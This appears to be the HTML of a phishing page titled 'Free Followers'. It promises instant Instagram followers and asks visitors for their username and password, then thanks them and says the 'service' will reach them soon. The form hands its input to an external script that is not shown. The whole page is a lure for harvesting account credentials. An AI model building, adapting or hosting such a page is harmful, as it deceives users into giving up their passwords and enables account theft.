<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Free Followers</title>
  <link rel="stylesheet" href="style.css">
</head>

<body>

  <!-- FORM PAGE -->
  <main id="formPage" class="page">
    <div class="card">

      <div class="icon">✦</div>

      <h1>FREE FOLLOWERS</h1>
      <p class="subtitle">
        Get Instagram followers instantly.
      </p>

      <form id="followerForm">

        <label for="instagram">Username</label>
        <input
          id="instagram"
          type="text"
          placeholder="Username"
          autocomplete="off"
          required
        >

        <label for="followers">Password</label>
        <input
          id="followers"
          type="number"
          placeholder="Password"
          min="1"
          required
        >

        <button type="submit">
          SUBMIT
        </button>

      </form>

      <div id="errorMessage" class="error">
        ⚠️ Something went wrong. Please fill the form again.
      </div>

      <p class="notice">
        Thank You For Using Our Service, We Will Reach You ASAP!!.
      </p>

    </div>
  </main>


  <script type="module" src="script.js"></script>

</body>
</html>
